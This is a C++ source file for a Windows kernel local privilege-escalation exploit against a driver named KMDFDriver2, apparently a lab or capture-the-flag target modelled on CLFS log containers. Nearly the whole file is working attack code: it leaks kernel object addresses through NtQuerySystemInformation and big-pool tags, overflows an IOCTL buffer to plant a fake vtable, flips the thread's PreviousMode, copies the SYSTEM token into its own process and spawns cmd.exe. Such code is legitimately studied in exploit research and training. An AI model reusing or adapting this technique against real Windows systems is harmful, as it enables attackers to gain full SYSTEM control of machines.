#include <iostream>

#include <Windows.h>
#include <winternl.h>

#include <initguid.h>
#include <SetupAPI.h>

#pragma comment(lib, "SetupAPI.lib")
#pragma comment(lib, "ntdll")

DEFINE_GUID(IOSample_DEVINTERFACE_GUID, 0x95cc5f28, 0x95d3, 0x44fd, 0x8d, 0xcd, 0x26, 0x4d, 0x4c, 0xe5, 0xfe, 0xcc);

#define CREATE_LOG 0x222004u
#define ADD_CONTAINER 0x222008u
#define READ_LOG 0x22200Cu
#define WRITE_LOG 0x222010u
#define REMOVE_CONTAINER 0x222014u
#define CLOSE_LOG 0x222018u

PWCHAR GetDevicePath(IN LPGUID InterfaceGuid)
{
    // 设备信息集
    HDEVINFO DeviceInfoSet;
    // 设备接口信息
    SP_DEVICE_INTERFACE_DATA DeviceInterfaceData;
    // 指向设备接口详细信息的指针
    PSP_DEVICE_INTERFACE_DETAIL_DATA DeviceInterfaceDetailData = NULL;
    // 函数指向结果返回值
    BOOL bResult;
    // 遍历
    DWORD dwIndex;

    ULONG Length, RequiredLength = 0;

    // 获取指定设备接口类的设备信息集
    DeviceInfoSet = SetupDiGetClassDevsA(InterfaceGuid,
                                         NULL, // Enumerator
                                         NULL, (DIGCF_PRESENT | DIGCF_DEVICEINTERFACE));
    if (INVALID_HANDLE_VALUE == DeviceInfoSet)
    {
        wprintf(L"[-] Error SetupDiGetClassDevs %d\n", GetLastError());
        return NULL;
    }

    // 枚举设备信息集下的所有设备的设备接口
    for (dwIndex = 0;; dwIndex++)
    {
        DeviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

        bResult = SetupDiEnumDeviceInterfaces(DeviceInfoSet, NULL, InterfaceGuid,
                                              dwIndex, // 第dwIndex个设备
                                              &DeviceInterfaceData);
        if (!bResult)
        {
            // 259错误表示遍历完成，这里没有做判断
            if (GetLastError() != ERROR_NO_MORE_ITEMS)
                printf("SetupDiEnumDeviceInterfaces failed! ErrNo:%d\n", GetLastError());

            SetupDiDestroyDeviceInfoList(DeviceInfoSet);
            break;
        }

        // 获取设备接口详细信息
        // 第一次调用，DeviceInterfaceDetailData置为NULL，获取待分配缓冲区的大小
        // 根据MSDN，此次调用返回值为FALSE，而且GetLastError为122，如果进行错误检查，需要注意
        SetupDiGetDeviceInterfaceDetail(DeviceInfoSet,
                                        &DeviceInterfaceData, // 待获取详细信息的设备接口
                                        NULL, 0, &RequiredLength, NULL);

        DeviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA)LocalAlloc(LMEM_FIXED, RequiredLength);
        if (NULL == DeviceInterfaceDetailData)
        {
            printf("Failed to allocate memory!\n");

            SetupDiDestroyDeviceInfoList(DeviceInfoSet);
            return NULL;
        }

        DeviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);

        Length = RequiredLength;

        // 第二次调用，返回设备接口详细信息
        bResult = SetupDiGetDeviceInterfaceDetail(DeviceInfoSet, &DeviceInterfaceData, DeviceInterfaceDetailData,
                                                  Length, &RequiredLength, NULL);

        if (!bResult)
        {
            printf("SetupDiGetDeviceInterfaceDetail failed(second)! ErrNo:%d\n", GetLastError());

            SetupDiDestroyDeviceInfoList(DeviceInfoSet);
            LocalFree(DeviceInterfaceDetailData);
            return NULL;
        }

        return DeviceInterfaceDetailData->DevicePath;
        // printf("DevicePath: %s\n", DeviceInterfaceDetailData->DevicePath);
        LocalFree(DeviceInterfaceDetailData);
    }

    return NULL;
}

HANDLE g_DeviceHandle;

struct LogRecord_parm
{
    void *logFile;
    int ContainerID;
    char data[512]; // ExAllocatePool 0x200
};

VOID WriteRecord(int id, LPCSTR data)
{
    LogRecord_parm parm = {0};
    parm.ContainerID = id;
    RtlFillMemory(parm.data, 0, sizeof(parm.data));

    BYTE X = 'X';
    memcpy(parm.data, data, sizeof(parm.data));

    DWORD dwBytesReturned;
    BOOL ret;
    ret = DeviceIoControl(g_DeviceHandle, WRITE_LOG, &parm, sizeof(parm), &X, 1, &dwBytesReturned, NULL);
    if (FALSE == ret)
    {
        wprintf(L"[-] Error WRITE_LOG\r\n");
        exit(1);
    }
}

struct removeLogContainer_parm
{
    void *logFile;
    int ContainerID;
};

VOID RemoveContainer(int id)
{
    removeLogContainer_parm parm = {0};
    parm.ContainerID = id;
    DWORD dwBytesReturned;
    BOOL ret;
    ret = DeviceIoControl(g_DeviceHandle, REMOVE_CONTAINER, &parm, sizeof(parm), NULL, 0, &dwBytesReturned, NULL);
    if (FALSE == ret)
    {
        wprintf(L"[-] Error REMOVE_CONTAINER\r\n");
        exit(1);
    }
}

VOID CloseLog()
{
    DWORD dwBytesReturned;
    BOOL ret;
    ret = DeviceIoControl(g_DeviceHandle, CLOSE_LOG, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
    if (FALSE == ret)
    {
        wprintf(L"[-] Error REMOVE_CONTAINER\r\n");
        exit(1);
    }
}

#define SystemModuleInformation (SYSTEM_INFORMATION_CLASS)0x0b
#define SystemHandleInformation (SYSTEM_INFORMATION_CLASS)0x10
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct
{
    ULONG Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

ULONGLONG GetModuleBase(LPCSTR szName)
{
    ULONG len = 0;
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    PSYSTEM_MODULE_INFORMATION pModuleInfo =
        (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

    if (status != (NTSTATUS)0x0)
    {
        wprintf(L"[-] Error NtQuerySystemInformation SystemModuleInformation \r\n");
        exit(1);
    }
    for (int i = 0; pModuleInfo != NULL && i < pModuleInfo->Count; ++i)
    {
        if (strstr(pModuleInfo->Modules[i].ImageName, szName))
        {
            PVOID kernelImageBase = pModuleInfo->Modules[0].Base;
            // wprintf(L"[*] %S base: %#llx\r\n", pModuleInfo->Modules[i].ImageName,
            // pModuleInfo->Modules[i].Base);
            return (ULONGLONG)pModuleInfo->Modules[i].Base;
        }
    }

    return 0;
}

struct myCLFS_METADATA_RECORD_HEADER
{
    unsigned int magic;
};

struct myLOG_HEADER // size 0x228
{
    myCLFS_METADATA_RECORD_HEADER hdrBaseRecord;
    unsigned __int64 logID;
    wchar_t *logName;
    unsigned int Containers;
    unsigned int cbBusyContainers;
    unsigned int rgContainers[128];
    unsigned int cbSymbolZone;
    unsigned int cbSector;
};

struct baseContainer;

struct baseContainer_vtbl
{
    ULONG64 Address[5];
};

struct baseContainer
{
    baseContainer_vtbl *__vftable /*VFT*/;
    char *data;
    const wchar_t *fileName;
};

struct my_CLFS_CONTAINER_CONTEXT
{
    unsigned __int64 cidContainer;
    wchar_t containerName[100];
    union {
        baseContainer *pContainer;
        unsigned __int64 ullAlignment;
    };
    unsigned int cbPrevOffset;
    unsigned int cbNextOffset;
};

// Get Kernel Infomation
ULONG64 g_SystemEprocess;
ULONG64 g_CurrentEprocess;
ULONG64 g_ExploitEthread;
DWORD g_CurrentPid;
HANDLE    g_ThreadExploitHandle;
// NtQuerySystemInfomation Leak Information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
    LONG __PADDING__[1];
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

VOID QuerySystemInfomation()
{
    DWORD CurPid = GetCurrentProcessId();
    g_CurrentPid = CurPid;
    g_ThreadExploitHandle = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
    // Process
    HANDLE hSelf = OpenProcess(PROCESS_QUERY_INFORMATION, 0, CurPid);
    if (hSelf == INVALID_HANDLE_VALUE || hSelf == NULL)
    {
        wprintf(L"[-] Error OpenProcess\r\n");
        exit(1);
    }

    // kthread and ktoken
    PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(0x100);
    ULONG OutBufLen = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, HandleInfo, 0x100, &OutBufLen);
    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(HandleInfo);
        HandleInfo = (SYSTEM_HANDLE_INFORMATION*)malloc(OutBufLen);
        status = NtQuerySystemInformation(SystemHandleInformation, HandleInfo, OutBufLen, &OutBufLen);
    }

    if (HandleInfo == NULL)
    {
        wprintf(L"[-] Error NtQuerySystemInformation SystemHandleInformation\r\n");
        exit(1);
    }

    // PID 当前进程 Handle 没有指定
    for (int i = 0; i < HandleInfo->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo->Handles[i];
        if (handleInfo.UniqueProcessId == CurPid)
        {
            wprintf(L"[*] PID %d\tObject %#llx\n", handleInfo.UniqueProcessId, (ULONG64)handleInfo.Object);
            break;
        }
    }

    // 找到 ExploitThread 的ETHREAD
    // 找到System的 EPROCESS
    // 找到当前进程的 EPROCESS
    for (ULONG i = 0; i < HandleInfo->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO HandleEntry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)HandleInfo->Handles[i];
        if (HandleEntry.UniqueProcessId == CurPid && HandleEntry.HandleValue == (ULONG)g_ThreadExploitHandle)
        {
            g_ExploitEthread = (ULONG64)HandleEntry.Object;
            wprintf(L"[*] Exploit thread PID: %d\thandle: %#x\t_KTHREAD: %#llx\n", HandleEntry.UniqueProcessId, HandleEntry.HandleValue, g_ExploitEthread);
        }

        // 当前进程 Eprocess
        if (HandleEntry.UniqueProcessId == CurPid && HandleEntry.HandleValue == (ULONG)hSelf)
        {
            g_CurrentEprocess = (ULONG64)HandleEntry.Object;
            wprintf(L"[*] Current PID: %d\thandle: %#x\t_EPROCESS: %#llx\n", HandleEntry.UniqueProcessId, (ULONG)hSelf, g_CurrentEprocess);
        }

        // System 进程 Eprocess
        if (HandleEntry.UniqueProcessId == 0x4 && HandleEntry.HandleValue == 0x4)
        { // SYSTEM Process has a handle to itself
            g_SystemEprocess = (ULONG64)HandleEntry.Object;
            wprintf(L"[*] System _EPROCESS: 0x%llx\r\n", g_SystemEprocess);
        }

        if (g_ExploitEthread != 0 && g_CurrentEprocess != 0 && g_SystemEprocess)
        {
            free(HandleInfo);
            break;
        }
    }
    // Get kthread and ktoken
    if (g_ExploitEthread == 0 || g_CurrentEprocess == 0 || g_SystemEprocess == 0)
    {
        wprintf(L"[-] Error Leak\n");
        exit(1);
    }
}

typedef struct _SYSTEM_BIGPOOL_ENTRY
{
    union {
        PVOID VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    ULONG_PTR SizeInBytes;
    union {
        UCHAR Tag[4];
        ULONG TagULong;
    };
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION
{
    ULONG Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ANYSIZE_ARRAY];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

#define SystemBigPoolInformation (SYSTEM_INFORMATION_CLASS)0x42

ULONG64 QueryBigPoolInformation()
{
    LPVOID lpHeap = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0);
    if (lpHeap == 0)
    {
        printf("[!!!] Unable to allocate a heap\n");
        exit(1);
    }
    // printf("[i] Gathering initial statistics\n");
    DWORD dwOutLength = 0;
    DWORD dwCurrentSize = 0;
    lpHeap = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpHeap, 0xFF);
    NTSTATUS ntLastStatus = NtQuerySystemInformation(SystemBigPoolInformation, lpHeap, 0x30,
                                                     &dwOutLength); // 0x30 is smallest size you can use to get accurate
                                                                    // output for length
    // printf("[i] NTSTATUS: %I64X Required Size of heap: %I64X\n", ntLastStatus,
    // dwOutLength);
    lpHeap = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpHeap,
                         dwOutLength + 0x1F); // Size changes rapidly, better to have extra space
    dwCurrentSize = dwOutLength;
    ntLastStatus = NtQuerySystemInformation(SystemBigPoolInformation, lpHeap, dwCurrentSize,
                                            &dwOutLength); // Real call
    // printf("[i] NTSTATUS: %I64X\n", ntLastStatus);
    PSYSTEM_BIGPOOL_INFORMATION pSystemBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)lpHeap;
    // printf("Number of big pools: %d\n", pSystemBigPoolInfo->Count);
    PSYSTEM_BIGPOOL_ENTRY pCurrentBigPoolEntry = pSystemBigPoolInfo->AllocatedInfo;
    DWORD dwNumberWritten = 0;

    for (int i = 0; i < pSystemBigPoolInfo->Count; i++)
    {
        if (0x4C674673u == (ULONG)pCurrentBigPoolEntry->TagULong)
        {
            // printf("Tag: %.4s | VA: 0x%I64X | Size (Bytes): 0x%I64X\n",
            // pCurrentBigPoolEntry->Tag, pCurrentBigPoolEntry->VirtualAddress,
            // pCurrentBigPoolEntry->SizeInBytes); // Only print 4 chars. Pool Tags
            // are always 4 chars
            HeapFree(GetProcessHeap(), 0, lpHeap);
            return (ULONG64)pCurrentBigPoolEntry->VirtualAddress ^ 1;
        }
        pCurrentBigPoolEntry++; // Next entry in SYSTEM_BIGPOOL_INFORMATION
    }
    HeapFree(GetProcessHeap(), 0, lpHeap);
    return 0;
}

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void HexDump(void* mem, unsigned int len) {
    unsigned int i, j;

    for (i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if (i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if (i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */ {
            printf("   ");
        }

        /* print ASCII dump */
        if (i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for (j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                if (j >= len) /* end of block, not really printing */ {
                    putchar(' ');
                }
                else if (isprint(((char*)mem)[j])) /* printable char */ {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                else /* other char */ {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
}

#pragma pack(1)
struct addLogContainer_parm
{
    void *logFile;
    unsigned int nameLen;
    wchar_t containerName[100];
    ULONGLONG fakeContainerAddress;
    ULONGLONG padding;
    baseContainer fakeContainer;  // 0x18
    baseContainer_vtbl vtbl;      // 5 * 0x8 = 0x28
    ULONG64 padiing3;               // PoC
    //ULONG64 padding4;               // 
    ULONG64 Change;
    ULONG padiing2;
};

typedef NTSTATUS(WINAPI* PNtWriteVirtualMemory) (
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite,
    _Out_opt_ PULONG NumberOfBytesWritten
    );

int wmain()
{
    wprintf(L"[+] Get base...\r\n");
    ULONGLONG ullDrvBase = GetModuleBase("KMDFDriver2");
    //ULONGLONG originVtable = 0x4168 + ullDrvBase;
    ULONGLONG ntoskrnlBase = GetModuleBase("ntoskrnl.exe");
    if (ullDrvBase == 0 || ntoskrnlBase == 0)
    {
        wprintf(L"[-] Error get base\r\n");
        exit(1);
    }

    wprintf(L"[*]\tDrvBase: %#llx \n\tntoskrnlBase: %#llx\r\n", ullDrvBase, ntoskrnlBase);

    QuerySystemInfomation();

    PWCHAR DevicePath;
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    BOOL bRetVal;

    DevicePath = GetDevicePath((LPGUID)&IOSample_DEVINTERFACE_GUID);

    if (NULL == DevicePath)
    {
        wprintf(L"[-] Error find Device\r\n");
        exit(1);
    }

    printf("[*] Device path: %S\n", DevicePath);

    g_DeviceHandle =
        CreateFileW(DevicePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_DeviceHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Error open Device\r\n");
        exit(1);
    }

    DWORD dwBytesReturned;
    ULONGLONG ullLogMem;
    WCHAR szName[] = L"\\??\\C:\\Users\\Public\\tmp.log";
    HANDLE hFile = CreateFileW(L"C:\\Users:\\Public\\tmp.log", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL, NULL);
    BOOL ret;
    ret = DeviceIoControl(g_DeviceHandle, CREATE_LOG, szName, sizeof(szName) * 2, &ullLogMem, sizeof(ullLogMem),
                          &dwBytesReturned, NULL);
    if (FALSE == ret)
    {
        wprintf(L"[-] Error CREATE_LOG \r\n");
        exit(1);
    }
    Sleep(2000);

    ULONG64 bigPool = QueryBigPoolInformation();
    if (bigPool == 0)
    {
        wprintf(L"[-] Error find pool, please reboot!\r\n");
    }
    wprintf(L"[+] Find Pool %#llx \r\n", bigPool);

    ULONG64 ullUserSeSetAccessStateGenericMapping = 0;
    HMODULE userNtosBase = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (userNtosBase)
    {
        ullUserSeSetAccessStateGenericMapping = (ULONG64)GetProcAddress(userNtosBase, "SeSetAccessStateGenericMapping");
    }
    ULONG64 offsetSeSetAccessStateGenericMapping = ullUserSeSetAccessStateGenericMapping - (ULONG64)userNtosBase;
    ULONG64 pSeSetAccessStateGenericMapping =  ntoskrnlBase + offsetSeSetAccessStateGenericMapping;
    wprintf(L"[*] Offset SeSetAccessStateGenericMapping ----------> %#llx\n", offsetSeSetAccessStateGenericMapping);
    wprintf(L"[*] SeSetAccessStateGenericMapping ----------> %#llx\n", pSeSetAccessStateGenericMapping);

    // ROP
    CHAR temp[100] = { 0 };
    RtlFillMemory(temp, sizeof(temp), 'h');
    addLogContainer_parm parm = { 0 };
    parm.logFile = NULL;
    parm.nameLen = sizeof(parm.containerName);
    MultiByteToWideChar(CP_ACP, 0, temp, -1, parm.containerName, 100);

    parm.fakeContainerAddress = bigPool + 0x228 + 0xe0;
    ULONG64 fakeContainerVtable = parm.fakeContainerAddress + sizeof(baseContainer);
    wprintf(L"[*] fakeContainer: %#llx\r\n", parm.fakeContainerAddress);
    wprintf(L"[*] fakeContainerVtable: %#llx\r\n", fakeContainerVtable);

    //////////// ROPgadget
    //ULONG64 pSeSetAccessStateGenericMapping = 0x6572b0 + ntoskrnlBase;
    // fake pContainer
    parm.padding = -1;
    parm.padiing3 = 0xCCCCCCCCCCCCCCCC;
    //parm.padding4 = 0xDDDDDDDDDDDDDDDD;
    parm.fakeContainer.__vftable = (baseContainer_vtbl*)fakeContainerVtable;
    parm.fakeContainer.data = (CHAR*)0xBBBBBBBBBBBBBBBB;
    parm.fakeContainer.fileName = (WCHAR*)0xAAAAAAAAAAAAAAAA;
    for (int i = 0; i < 5; i++)
    {
        parm.vtbl.Address[i] = pSeSetAccessStateGenericMapping;
    }
    parm.Change = g_ExploitEthread + 0x232 - 0x8;  // PreviousMode
    parm.padiing2 = 0;
    // fake pContainer

    //HexDump((LPVOID)&parm, sizeof(addLogContainer_parm));
    Sleep(2000);
    wprintf(L"[+] Add container\r\n");
    ret = DeviceIoControl(
        g_DeviceHandle, 
        ADD_CONTAINER, 
        &parm, sizeof(parm), 
        &ullLogMem, sizeof(ullLogMem),
        &dwBytesReturned, 
        NULL);
    if (FALSE == ret)
    {
        wprintf(L"[-] Error ADD_CONTAINER\r\n");
        exit(1);
    }

    wprintf(L"[+] Read container\r\n");
    LogRecord_parm inBuf = { 0 };
    LogRecord_parm outBuf = { 0 };
    inBuf.ContainerID = 0;
    outBuf.ContainerID = 0;
    ret = DeviceIoControl(
        g_DeviceHandle, 
        READ_LOG, 
        &inBuf, sizeof(inBuf), 
        &outBuf, sizeof(outBuf), 
        &dwBytesReturned, 
        NULL);
    if (FALSE == ret)
    {
        wprintf(L"[-] Error READ_LOG\r\n");
        exit(1);
    }
    Sleep(2000);
    //std::cin.get();

    HANDLE hCur = GetCurrentProcess();
    PNtWriteVirtualMemory NtWriteVirtualMemory = (PNtWriteVirtualMemory)::GetProcAddress(::LoadLibraryW(L"ntdll.dll"), "NtWriteVirtualMemory");
    if (NULL == NtWriteVirtualMemory)
    {
        wprintf(L"[-] Error GetProcAddress NtWriteVirtualMemory\r\n");
        exit(1);
    }
    ULONG BytesWritten = 0;
    ULONG64 Token[] = { 0, 0, 0, 0 };
    // addr => buffer
    NtWriteVirtualMemory(
        hCur,
        &Token,
        (PVOID)(g_SystemEprocess + 0x4b8 - 0x10), //   +0x4b8 Token
        sizeof(Token),
        &BytesWritten);
    wprintf(L"[*] Read System token: %#llx %#llx %#llx %#llx\n", Token[0], Token[1], Token[2], Token[3]);
    if (BytesWritten == 0)
    {
        wprintf(L"[-] Error read token, please reboot...\n");
        exit(1);
    }
    //std::cin.get();

    // buffer => address
    NtWriteVirtualMemory(
        hCur,
        (PVOID)(g_CurrentEprocess + 0x4b8),
        &Token[2],
        8,
        &BytesWritten
    );

    // write back PreviousMode => 1
    wprintf(L"[+] Write PrevoiuaMode 1\r\n");
    Sleep(2000);
    BYTE PreviousMode = 1;
    if (NtWriteVirtualMemory(
        hCur,
        (PVOID)(g_ExploitEthread + 0x232),
        &PreviousMode,
        1,
        &BytesWritten
    ))
    {
        wprintf(L"[-] Error NtWriteVirtualMemory\r\n");
        exit(1);
    }

    wprintf(L"[+] Get shell... \r\n");
    system("cmd.exe");

    CloseHandle(hFile);
    CloseHandle(hDevice);
    return EXIT_SUCCESS;
}

// bp KMDFDriver2!ceateMyLogFile
// bp KMDFDriver2+0x1BB3   bigpool
// bp KMDFDriver2!addLogContainer
// bp KMDFDriver2+0x17AB      wstrcpy
// bp KMDFDriver2!readLogRecord
// bp KMDFDriver2+0x2055